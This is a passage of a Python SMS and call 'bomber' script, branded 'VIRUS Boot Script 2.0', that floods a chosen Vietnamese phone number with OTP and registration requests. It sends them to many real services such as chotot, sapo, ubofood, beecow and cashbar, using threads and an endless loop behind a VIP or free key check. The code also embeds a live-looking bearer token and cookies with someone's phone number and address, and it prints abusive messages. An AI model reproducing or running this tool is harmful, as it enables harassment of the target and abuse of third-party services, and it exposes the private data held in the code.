        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'deviceInfo': '{"operationSys":"","channel":null,"isMobile":"0","navigatorInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36","screenHeight":768,"screenWidth":1366}',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'token': 'null',
    }

    data = {
        'phone': phone,
        'sign': '67d44dda-b29f-48a4-9830-67121bc618f8',
    }

    response = requests.post('https://api.tiencash.com/v1/verify/sms/send', headers=headers, data=data)
def sms67(sdt):
  headers = {
    'Host': 'api.beecow.com',
    # 'content-length': '138',
    'content-type': 'application/json; text/plain',
    'accept': 'application/json, text/plain, application/stream+json',
    'ati': '1467350218617',
    'platform': 'WEB',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'time-zone': 'Asia/Saigon',
    'origin': 'https://admin.gosell.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://admin.gosell.vn/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    }
  data = '{"password":"12345ccok@","displayName":"","locationCode":"VN-SG","langKey":"vi","mobile":{"countryCode":"+84","phoneNumber":"sdt"}}'.replace('sdt',sdt)
  response = requests.post('https://api.beecow.com/api/register/gosell', headers=headers, data=data)
def sms68(sdt):
  headers = {
    'Host': 'www.sapo.vn',
    # 'content-length': '22',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'accept': '*/*',
    'origin': 'https://www.sapo.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.1060296146.1691285262; _gid=GA1.2.497444655.1691285263; _ga_YNVPPJ8MZP=GS1.1.1691285263.1.0.1691285263.60.0.0; _ga=GA1.1.1816034013.1691285263; _ga_8956TVT2M3=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_CDD1S5P7D4=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_GECRBQV6JK=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_Y9YZPDEGP0=GS1.1.1691285265.1.0.1691285265.60.0.0; start_time=08/06/2023 8:27:45; source=https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay; _ga_X10JR147Y7=GS1.1.1691285264.1.0.1691285265.59.0.0; _fbp=fb.1.1691285267174.309606627; _ga_EBZKH8C7MK=GS1.2.1691285267.1.0.1691285267.0.0.0; referral=https://www.google.com/; landing_page=https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay; pageview=1; _ga_8Z6MB85ZM2=GS1.1.1691285265.1.1.1691285333.60.0.0',
    }
  data = {
    'phonenumber': f'{sdt}',
  }
  response = requests.post('https://www.sapo.vn/fnb/sendotp', headers=headers, data=data).json()
def sms69(sdt):
  headers = {
    'Host': 'ubofood.com',
    'Connection': 'keep-alive',
    # 'Content-Length': '54',
    'Accept': 'application/json, text/plain, */*',
    'Cache-Control': 'no-cache',
    'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjM0MjM5OTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.QyAD_zWYVih-q10DAPQW_pCAvh7FDic4rpxgIubO3eqq9rvnzLmFUU3vm8NCRBB-ot4QO8EpyPu8VZ1RDALB7xOJqaUOzJ_sEWwNMZXr9Zl1DB8MsowoneZKq0IeQmF7AsWZ2nOCXQThVXCjDpdX6z0sfDUVbSBCvkoXKElFawG86Eo9VDFqGmR9W6abT8Y04wkeKSIAPc0N9dGUFTwmbjH3ihNWxsTwo2x_tavHlh8uvXR4Cl_qyewiUFaPkvn7joDEAQu04ub530yoge-zzlW2Dqjw0cfT1zH0QPqBS_bhtZQcJ0sxEfVgAHE9w5MIxPA6mSIBn6kGnZpaWa5vlNbxAEcZCAuprIRy9Ap-qIu6tmmlkPMTuOGPAWBaffWtkP28EV4xfNm9CQOTkGTZLKRo3o2YrT1HGm6na08kQZaBmmd5zCdSCDPC4X2xRH8BPpBs08oZfuORCVsWpCcwL_8pvaMbb4wwTEzfFkKAIjzXjFUu4B2Hq4ymNixu-mCcXmW5z5FC-Kzg4b2pUYuf7umoOLAnFVfNK_0j37gSYT0DeLdjWWyS5pZOCom-18XRoOnDhwhA_Dc0Emby-xX-BNiVSXvzderCWsGkffVKSv2NYiAEcVcobY9WvPAwSi-FAfCycO3X3RNb3zVoecfrpu6SCzkbK_atUotFNL_C3uU',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://ubofood.com',
    'X-Requested-With': 'mark.via.gp',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://ubofood.com/register',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': '_gcl_au=1.1.1893195422.1691887985; _ga=GA1.1.920343154.1691887985; _tt_enable_cookie=1; _ttp=W3eMdboFrsZyxJg3xa7ZNN35ySW; _fbp=fb.1.1691887986713.850575362; ubo_trade=%7B%22code%22%3A%22379760000%22%2C%22name%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22email%22%3A%22%22%2C%22phone_number%22%3A%220828215656%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%223%22%2C%22name%22%3A%22Mi%E1%BB%81n%20Nam%22%7D%2C%22city%22%3A%7B%22code%22%3A%2279%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh%22%7D%2C%22district%22%3A%7B%22code%22%3A%22760%22%2C%22name%22%3A%22Qu%E1%BA%ADn%201%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2226740%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9%22%7D%2C%22text%22%3A%2206%20Th%C3%A1i%20V%C4%83n%20Lung%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A10.778755%2C%22lng%22%3A106.70528%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-10-15T08%3A24%3A02.2Z%22%2C%22updated_at%22%3A%222023-06-15T03%3A15%3A26.154Z%22%2C%22updated_by%22%3A%22anhltt%22%2C%22default_pos_code%22%3A%22379760001%22%7D; ubo_token=Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjM0MjM5OTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.QyAD_zWYVih-q10DAPQW_pCAvh7FDic4rpxgIubO3eqq9rvnzLmFUU3vm8NCRBB-ot4QO8EpyPu8VZ1RDALB7xOJqaUOzJ_sEWwNMZXr9Zl1DB8MsowoneZKq0IeQmF7AsWZ2nOCXQThVXCjDpdX6z0sfDUVbSBCvkoXKElFawG86Eo9VDFqGmR9W6abT8Y04wkeKSIAPc0N9dGUFTwmbjH3ihNWxsTwo2x_tavHlh8uvXR4Cl_qyewiUFaPkvn7joDEAQu04ub530yoge-zzlW2Dqjw0cfT1zH0QPqBS_bhtZQcJ0sxEfVgAHE9w5MIxPA6mSIBn6kGnZpaWa5vlNbxAEcZCAuprIRy9Ap-qIu6tmmlkPMTuOGPAWBaffWtkP28EV4xfNm9CQOTkGTZLKRo3o2YrT1HGm6na08kQZaBmmd5zCdSCDPC4X2xRH8BPpBs08oZfuORCVsWpCcwL_8pvaMbb4wwTEzfFkKAIjzXjFUu4B2Hq4ymNixu-mCcXmW5z5FC-Kzg4b2pUYuf7umoOLAnFVfNK_0j37gSYT0DeLdjWWyS5pZOCom-18XRoOnDhwhA_Dc0Emby-xX-BNiVSXvzderCWsGkffVKSv2NYiAEcVcobY9WvPAwSi-FAfCycO3X3RNb3zVoecfrpu6SCzkbK_atUotFNL_C3uU; _ga_KCGG79N4SY=GS1.1.1691887985.1.1.1691887993.0.0.0; _ga_3PKTQRQF3P=GS1.1.1691887985.1.1.1691888009.36.0.0',
    }
  data = '{"phone_number":"sdt","trade_code":"379760000"}'.replace('sdt',sdt)
  response = requests.post('https://ubofood.com/api/v1/account/customers/register', headers=headers, data=data).text
def sms70(sdt):
  headers = {
    'Host': 'gateway.chotot.com',
    # 'content-length': '22',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'accept': '*/*',
    'origin': 'https://id.chotot.com',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://id.chotot.com/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    
  }
  data = '{"phone":"sdt"}'.replace("sdt",sdt)
  response = requests.post('https://gateway.chotot.com/v2/public/auth/send_otp_verify', headers=headers, data=data).json()
def sms71(sdt):
  headers = {
    'Host': 'api.cashbar.tech',
    # 'content-length': '73',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://h5.cashbar.work',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://h5.cashbar.work/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = {
    'phone': f'{sdt}',
    'type': '2',
    'ctype': '1',
    'chntoken': '7f38e65de6b47136eaa373feade6cd33',
  }
  response = requests.post('https://api.cashbar.tech/h5/LoginMessage_ultimate', headers=headers, data=data).json()
def run(phone):
  threading.submit(regthantaioi,phone)
  threading.submit(sapo,phone)
  threading.submit(onecredit,phone)
  threading.submit(y360,phone)
  threading.submit(tv360,phone)
  threading.submit(winmart,phone)
  threading.submit(apispam,phone)
  threading.submit(vieon,phone)
  threading.submit(poyeye,phone)
  threading.submit(alfrescos,phone)
  threading.submit(fpt,phone)
  threading.submit(kiot,phone) 
  threading.submit(vayvnd,phone)
  threading.submit(viettel,phone)
  threading.submit(tamo,phone)
  threading.submit(meta,phone)
  threading.submit(funring,phone)
  threading.submit(dkvt,phone)
  threading.submit(fptplay,phone)
  threading.submit(vietid,phone)
  threading.submit(phamacy,phone)
  threading.submit(y360rs,phone)
  threading.submit(concung,phone)
  threading.submit(appota,phone)
  threading.submit(pizzacompany,phone)
  threading.submit(best_inc,phone)
  threading.submit(shopiness,phone)
  threading.submit(ghn,phone)
  threading.submit(chotot,phone)
  threading.submit(cashbar,phone)
  threading.submit(ubofood,phone)
  threading.submit(bibabo,phone)
  threading.submit(itaphoa,phone)
  threading.submit(findo,phone)
  threading.submit(beecow,phone)
  threading.submit(cashberry,phone)
  threading.submit(takomo,phone)
  threading.submit(kimungvay,phone)
  threading.submit(thantaioi,phone)
def chay1(phone):
            phone1='+84'+phone
            a=1
            while a<2:
                sms0(phone)
                sms1(phone)
                sms2(phone)
                call1(phone)
                thantai(phone)
                sms3(phone)
                sms4(phone)
                sms5(phone)
                call2(phone)
                denthan(phone)
                sms7(phone)
                sms8(phone)
                moneyveo(phone)
                call3(phone)
                call(phone)
                sms10(phone)
                sms11(phone)
                call4(phone)
                pizza(phone)
                moneyveo(phone)
                sms14(phone)
                call5(phone)
                sms15(phone)
                sms16(phone)
                call5(phone)
                sms19(phone)
                sms20(phone)
                call7(phone)
                call8(phone)
                sms24(phone)
                moneyveo(phone)
                sms25(phone)
                sms26(phone)
                call1(phone)
                thantai(phone)
                sms29(phone)
                call2(phone)
                denthan(phone)
                sms0(phone)
                sms31(phone)
                sms32(phone)
                call3(phone)
                call(phone)
                sms33(phone)
                sms34(phone)
                sms35(phone)
                call4(phone)
                pizza(phone)
                call5(phone)
                sms42(phone)
                sms43(phone)
                moneyveo(phone)
                sms44(phone)
                call6(phone)
                sms48(phone)
                call7(phone)
                sms481(phone)
                sms49(phone)
                sms0(phone)
                sms52(phone)
                call8(phone)
                sms53(phone)
                moneyveo(phone)
                sms55(phone)
                sms56(phone)
                call1(phone)
                thantai(phone)
                sms58(phone)
                sms59(phone)
                call2(phone)    
                denthan(phone)        
                sms61(phone)
                call(phone)
                sms1(phone)
                pizza(phone)
                call9(phone)
                sms62(phone)
                sms63(phone)
                sms64(phone)
                call10(phone)
                sms65(phone)
                sms66(phone)
                call11(phone)
                sms67(phone)
                sms68(phone)
                sms69(phone)
                call12(phone)
                sms70(phone)
                sms71(phone)
                run(phone)
                a=2
def chay2(phone):
            phone1='+84'+phone
            a=1
            while a<2:
                sms0(phone)
                sms1(phone)
                sms2(phone)
                call1(phone)
                thantai(phone)
                sms3(phone)
                sms4(phone)
                sms5(phone)
                call2(phone)
                denthan(phone)
                sms7(phone)
                sms8(phone)
                moneyveo(phone)
                call3(phone)
                call(phone)
                sms10(phone)
                sms11(phone)
                call4(phone)
                pizza(phone)
                moneyveo(phone)
                sms14(phone)
                call5(phone)
                sms15(phone)
                sms16(phone)
                call5(phone)
                sms19(phone)
                sms20(phone)
                call7(phone)
                call8(phone)
                sms24(phone)
                moneyveo(phone)
                sms25(phone)
                sms26(phone)
                call1(phone)
                thantai(phone)
                sms29(phone)
                call2(phone)
                denthan(phone)
                sms0(phone)
                sms31(phone)
                sms32(phone)
                call3(phone)
                call(phone)
                sms33(phone)
                sms34(phone)
                sms35(phone)
                call4(phone)
                pizza(phone)
                call5(phone)
                sms42(phone)
                sms43(phone)
                moneyveo(phone)
                sms44(phone)
                call6(phone)
                sms48(phone)
                call7(phone)
                sms481(phone)
                sms49(phone)
                sms0(phone)
                sms52(phone)
                call8(phone)
                sms53(phone)
                moneyveo(phone)
                sms55(phone)
                sms56(phone)
                call1(phone)
                thantai(phone)
                sms58(phone)
                sms59(phone)
                call2(phone)    
                denthan(phone)        
                sms61(phone)
                call(phone)
                sms1(phone)
                pizza(phone)
                call9(phone)
                sms62(phone)
                sms63(phone)
                sms64(phone)
                call10(phone)
                sms65(phone)
                sms66(phone)
                call11(phone)
                sms67(phone)
                sms68(phone)
                sms69(phone)
                call12(phone)
                sms70(phone)
                sms71(phone)
                run(phone)
                a=2
blue = Col.light_blue
lblue = Colors.StaticMIX((Col.light_green, Col.white, Col.white))
red = Colors.StaticMIX((Col.green, Col.white, Col.white))
def format_print(symbol, text):
    return f"""                      {Col.Symbol(symbol, lblue, blue)} {lblue}{text}{Col.reset}"""

def format_input(symbol, text):
    return f"""                      {Col.Symbol(symbol, red, blue)} {red}{text}{Col.reset}"""
def Banner():
    os.system("cls" if os.name == "nt" else "clear")
    title = """\n
"""
    banner =f"""
┌─────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                                 │
│                              ██╗   ██╗██╗██████╗ ██╗   ██╗███████╗                              │
│                              ██║   ██║██║██╔══██╗██║   ██║██╔════╝                              │
│                              ██║   ██║██║██████╔╝██║   ██║███████╗                              │
│                              ╚██╗ ██╔╝██║██╔══██╗██║   ██║╚════██║                              │
│                               ╚████╔╝ ██║██║  ██║╚██████╔╝███████║                              │
│                                ╚═══╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                              │
│                                                                             Boot Script 2.0     │
└─────────────────────────────────────────────────────────────────────────────────────────────────┘
\n"""
    print(Colorate.Vertical(Colors.DynamicMIX((Col.light_green, Col.light_blue)), Center.XCenter(title.center(100))) + Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.light_green)), Center.XCenter(banner.center(100))))
def spam():
    Banner()
    print(format_print("1","Enter tool VIP"))
    print(format_print("2","Enter tool FREE"))
    choice=int(input(format_input("#","What your opinion ? : ")))
        
    if choice==2:
      import os
      os.system('cls')
      Banner()
      key=input(format_input("+","VUI LONG NHAP KEY FREE: "))
      b=''
      sdt=[]
      import requests
      from html import unescape
      response = requests.get('https://anotepad.com/notes/e3hpqe3q')
      text = response.text
      start_index = text.find('&#39;')
      if start_index != -1:
          end_index = text.find('&#39;', start_index + 1)
          if end_index != -1:
              b = text[start_index + 5:end_index]
              b = unescape(b)
          if '<div class="footer-ads">' in b:
              b='dhasukdgashd837126hd62'
          if key == key1:
            print(format_print("?","Key đúng"))
            import os
            import requests, json
            import uuid
            import time, random, string
            import time
            Banner()
            def chay():
                  global phone
                  phone=input(format_input("+","Nhập số điện thoại cần SPAM: "))
                  
                  if phone in sdt:
                      print(format_print("$","HAIZ chào con chó, mày muốn spam tao sao. OK nhưng trước hết tao sẽ spam m trước"))
                      phone='0123456789'
                  phone1='+84'+phone
                  a=1
                  while a<2:
                        sms0(phone)
                        sms1(phone)
                        sms2(phone)
                        call1(phone)
                        thantai(phone)
                        sms3(phone)
                        sms4(phone)
                        sms5(phone)
                        call2(phone)
                        denthan(phone)
                        sms7(phone)
                        sms8(phone)
                        moneyveo(phone)
                        call3(phone)
                        call(phone)
                        sms10(phone)
                        sms11(phone)
                        call4(phone)
                        pizza(phone)
                        moneyveo(phone)
                        sms14(phone)
                        call5(phone)
                        sms15(phone)
                        sms16(phone)
                        call5(phone)
                        sms19(phone)
                        sms20(phone)
                        call7(phone)
                        call8(phone)
                        sms24(phone)
                        moneyveo(phone)
                        sms25(phone)
                        sms26(phone)
                        call1(phone)
                        thantai(phone)
                        sms29(phone)
                        call2(phone)
                        denthan(phone)
                        sms0(phone)
                        sms31(phone)
                        sms32(phone)
                        call3(phone)
                        call(phone)
                        sms33(phone)
                        sms34(phone)
                        sms35(phone)
                        call4(phone)
                        pizza(phone)
                        call5(phone)
                        sms42(phone)
                        sms43(phone)
                        moneyveo(phone)
                        sms44(phone)
                        call6(phone)
                        sms48(phone)
                        call7(phone)
                        sms481(phone)
                        sms49(phone)
                        sms0(phone)
                        sms52(phone)
                        call8(phone)
                        sms53(phone)
                        moneyveo(phone)
                        sms55(phone)
                        sms56(phone)
                        call1(phone)
                        thantai(phone)
                        sms58(phone)
                        sms59(phone)
                        call2(phone)    
                        denthan(phone)        
                        sms61(phone)
                        call(phone)
                        sms1(phone)
                        pizza(phone)
                        call9(phone)
                        sms62(phone)
                        sms63(phone)
                        sms64(phone)
                        call10(phone)
                        sms65(phone)
                        sms66(phone)
                        call11(phone)
                        sms67(phone)
                        sms68(phone)
                        sms69(phone)
                        call12(phone)
                        sms70(phone)
                        sms71(phone)
                        run(phone)
                        a=2
            chay() 
            os.system('cls')
            Banner()
            print(Fore.LIGHTBLUE_EX + "                       ╔═══════════════════════════════╗")
            print("                       ║" + Fore.LIGHTRED_EX + "╔═════════════════════════════╗" + Fore.RESET + "╚╗")
            print("                       ║" + Fore.LIGHTBLUE_EX + "║" + Fore.RESET + "░░░░░░░░░░░░░░░░░░░░" + Fore.LIGHTGREEN_EX + "═════════" + Fore.RESET  + Fore.RESET + "╚╗╚╗")
            print("                       ║" + Fore.RESET + "║")
            print("                       ║" + Fore.RESET + "║BOMB TO : '" + Fore.LIGHTBLUE_EX + phone + Fore.RESET + "'")
            print("                       ║" + Fore.RESET + "║SUCCESS : '" + Fore.LIGHTRED_EX + str(thanhcong) + Fore.RESET + "'")
            print("                       ║" + Fore.RESET + "║FAIL    : '" + Fore.LIGHTYELLOW_EX + str(thatbai) + Fore.RESET + "'")
            print("                       ║" + Fore.RESET + "║")
            print("                       ║" + Fore.RESET + "║" + Fore.RESET + "░░░░░░░░░░░░░░░░░░░░" + Fore.LIGHTGREEN_EX + "══════════" + Fore.RESET + "╝" + Fore.RESET + "╔╝")
            print("                       ║" + Fore.LIGHTRED_EX + "╚═════════════════════════════╝" + "╔╝")
            print(Fore.RESET + "                       ╚═══════════════════════════════╝")
            tung=0
            while tung==0:
                    chay1(phone)
                    os.system('cls')
                    Banner()
                    print(Fore.LIGHTBLUE_EX + "                       ╔═══════════════════════════════╗")
                    print("                       ║" + Fore.LIGHTRED_EX + "╔═════════════════════════════╗" + Fore.RESET + "╚╗")
                    print("                       ║" + Fore.LIGHTBLUE_EX + "║" + Fore.RESET + "░░░░░░░░░░░░░░░░░░░░" + Fore.LIGHTGREEN_EX + "═════════" + Fore.RESET  + Fore.RESET + "╚╗╚╗")
                    print("                       ║" + Fore.RESET + "║")
                    print("                       ║" + Fore.RESET + "║BOMB TO : '" + Fore.LIGHTBLUE_EX + phone + Fore.RESET + "'")
                    print("                       ║" + Fore.RESET + "║SUCCESS : '" + Fore.LIGHTRED_EX + str(thanhcong) + Fore.RESET + "'")
                    print("                       ║" + Fore.RESET + "║FAIL    : '" + Fore.LIGHTYELLOW_EX + str(thatbai) + Fore.RESET + "'")
                    print("                       ║" + Fore.RESET + "║")
                    print("                       ║" + Fore.RESET + "║" + Fore.RESET + "░░░░░░░░░░░░░░░░░░░░" + Fore.LIGHTGREEN_EX + "══════════" + Fore.RESET + "╝" + Fore.RESET + "╔╝")
                    print("                       ║" + Fore.LIGHTRED_EX + "╚═════════════════════════════╝" + "╔╝")
                    print(Fore.RESET + "                       ╚═══════════════════════════════╝")
          while key!=key1:
              print(format_print("$","Key sai"))
              import requests
              import re
              def center_text(text):
                  terminal_width = 80  # Giá trị cố định, thay đổi nếu cần
                  padding = (terminal_width - len(text)) // 2
                  centered_text = ' ' * padding + text
                  return centered_text
              Banner()
              key=input(format_input("+","VUI LONG NHAP KEY FREE: "))
              b=''
              sdt=[]
              import requests
              from html import unescape

              response = requests.get('https://anotepad.com/notes/e3hpqe3q')
              text = response.text

              start_index = text.find('&#39;')
              if start_index != -1:
                  end_index = text.find('&#39;', start_index + 1)
                  if end_index != -1:
                      b = text[start_index + 5:end_index]
                      b = unescape(b)
                  if key == key1:
                    print(format_print("?","Key đúng"))
                    import os
                    import requests, json
                    import uuid
                    import time, random, string
                    import time
                    os.system('cls')
                    Banner()
                    def chay():
                          global phone
                          phone=input(format_input("+","Nhập số điện thoại cần SPAM: "))
                          
                          if phone in sdt:
                              print(format_print("$","HAIZ chào con chó, mày muốn spam tao sao. OK nhưng trước hết tao sẽ spam m trước"))
                              phone='0123456789'
                          phone1='+84'+phone
                          a=1
                          while a<2:
                                sms0(phone)
                                sms1(phone)
                                sms2(phone)
                                call1(phone)
                                thantai(phone)
                                sms3(phone)
                                sms4(phone)
                                sms5(phone)
                                call2(phone)
                                denthan(phone)
                                sms7(phone)
                                sms8(phone)
                                moneyveo(phone)
                                call3(phone)
                                call(phone)
                                sms10(phone)
                                sms11(phone)
                                call4(phone)
                                pizza(phone)
                                moneyveo(phone)
                                sms14(phone)
                                call5(phone)
                                sms15(phone)
                                sms16(phone)
                                call5(phone)
                                sms19(phone)
                                sms20(phone)
                                call7(phone)
                                call8(phone)
                                sms24(phone)
                                moneyveo(phone)
                                sms25(phone)
                                sms26(phone)
                                call1(phone)
                                thantai(phone)
                                sms29(phone)
                                call2(phone)
                                denthan(phone)
                                sms0(phone)
                                sms31(phone)
                                sms32(phone)
                                call3(phone)
                                call(phone)
                                sms33(phone)
                                sms34(phone)
                                sms35(phone)
                                call4(phone)
                                pizza(phone)
                                call5(phone)
                                sms42(phone)
                                sms43(phone)
                                moneyveo(phone)
                                sms44(phone)
                                call6(phone)
                                sms48(phone)
                                call7(phone)
                                sms481(phone)
                                sms49(phone)
                                sms0(phone)
                                sms52(phone)
                                call8(phone)
                                sms53(phone)
                                moneyveo(phone)
                                sms55(phone)
                                sms56(phone)
                                call1(phone)
                                thantai(phone)
                                sms58(phone)
                                sms59(phone)
                                call2(phone)    
                                denthan(phone)        
                                sms61(phone)
                                call(phone)
                                sms1(phone)
                                pizza(phone)
                                call9(phone)
                                sms62(phone)
                                sms63(phone)
                                sms64(phone)
                                call10(phone)
                                sms65(phone)
                                sms66(phone)
                                call11(phone)
                                sms67(phone)
                                sms68(phone)
                                sms69(phone)
                                call12(phone)
                                sms70(phone)
                                sms71(phone)
                                run(phone)
                                a=2
                    chay()
                    os.system('cls')
                    Banner()
                    print(Fore.LIGHTBLUE_EX + "                       ╔═══════════════════════════════╗")
                    print("                       ║" + Fore.LIGHTRED_EX + "╔═════════════════════════════╗" + Fore.RESET + "╚╗")
                    print("                       ║" + Fore.LIGHTBLUE_EX + "║" + Fore.RESET + "░░░░░░░░░░░░░░░░░░░░" + Fore.LIGHTGREEN_EX + "═════════" + Fore.RESET  + Fore.RESET + "╚╗╚╗")
                    print("                       ║" + Fore.RESET + "║")
                    print("                       ║" + Fore.RESET + "║BOMB TO : '" + Fore.LIGHTBLUE_EX + phone + Fore.RESET + "'")
                    print("                       ║" + Fore.RESET + "║SUCCESS : '" + Fore.LIGHTRED_EX + str(thanhcong) + Fore.RESET + "'")
                    print("                       ║" + Fore.RESET + "║FAIL    : '" + Fore.LIGHTYELLOW_EX + str(thatbai) + Fore.RESET + "'")
                    print("                       ║" + Fore.RESET + "║")
                    print("                       ║" + Fore.RESET + "║" + Fore.RESET + "░░░░░░░░░░░░░░░░░░░░" + Fore.LIGHTGREEN_EX + "══════════" + Fore.RESET + "╝" + Fore.RESET + "╔╝")
                    print("                       ║" + Fore.LIGHTRED_EX + "╚═════════════════════════════╝" + "╔╝")
                    print(Fore.RESET + "                       ╚═══════════════════════════════╝")
                    tung=0
                    while tung==0:
                          chay1(phone)
                          os.system('cls')
                          Banner()
                          print(Fore.LIGHTBLUE_EX + "                       ╔═══════════════════════════════╗")
                          print("                       ║" + Fore.LIGHTRED_EX + "╔═════════════════════════════╗" + Fore.RESET + "╚╗")
                          print("                       ║" + Fore.LIGHTBLUE_EX + "║" + Fore.RESET + "░░░░░░░░░░░░░░░░░░░░" + Fore.LIGHTGREEN_EX + "═════════" + Fore.RESET  + Fore.RESET + "╚╗╚╗")
                          print("                       ║" + Fore.RESET + "║")
                          print("                       ║" + Fore.RESET + "║BOMB TO : '" + Fore.LIGHTBLUE_EX + phone + Fore.RESET + "'")
                          print("                       ║" + Fore.RESET + "║SUCCESS : '" + Fore.LIGHTRED_EX + str(thanhcong) + Fore.RESET + "'")
                          print("                       ║" + Fore.RESET + "║FAIL    : '" + Fore.LIGHTYELLOW_EX + str(thatbai) + Fore.RESET + "'")
                          print("                       ║" + Fore.RESET + "║")
                          print("                       ║" + Fore.RESET + "║" + Fore.RESET + "░░░░░░░░░░░░░░░░░░░░" + Fore.LIGHTGREEN_EX + "══════════" + Fore.RESET + "╝" + Fore.RESET + "╔╝")
                          print("                       ║" + Fore.LIGHTRED_EX + "╚═════════════════════════════╝" + "╔╝")
                          print(Fore.RESET + "                       ╚═══════════════════════════════╝")

    else:
      if choice == 1:

        sdt=[]
        import datetime
        import logging
        import time
        import os
        current_directory = os.path.dirname(os.path.abspath(__file__))
        log_path = os.path.join(current_directory, '.logging.txt')
        def remove_code_from_log(code):
            code = encrypt(code,5)
            with open(log_path, 'r') as log_file:
                log_content = log_file.readlines()

            log_content = [line.replace(code, '') for line in log_content]

            with open(log_path, 'w') as log_file:
                log_file.writelines(log_content)
            print(log_content)
        def check_code(code):
            global ngay
            if code=='SPAMVIPLIFETIME':
                return True
            elif len(code) < 18:
                print(format_print("%","Hãy nhập đúng code"))
                return False
            elif code == 'TUNGHACKERLORDPROVIP123456':
                print(format_print("=.=","Bạn đang sử dụng code trial có giá trị 1 ngày"))
                ngay=1
                time.sleep(2)
                return True
            code = encrypt(code,5)
            with open(log_path, 'r') as log_file:
                log_content = log_file.read()
            if code in log_content:
                print(format_print("=.=","Bạn đang sử dụng key VIP có giá trị 7 ngày"))
                ngay=7
                time.sleep(2)
                return True
            else:
                return False
        os.system('cls')
        Banner()
        user_code = input(format_input('+',"ENTER CODE VIP : "))
        # Kiểm tra code và hiển thị kết quả
        if check_code(user_code)==True:
            code_path='.codetimeprovip'+user_code+'.txt'
            current_directory = os.path.dirname(os.path.abspath(__file__))
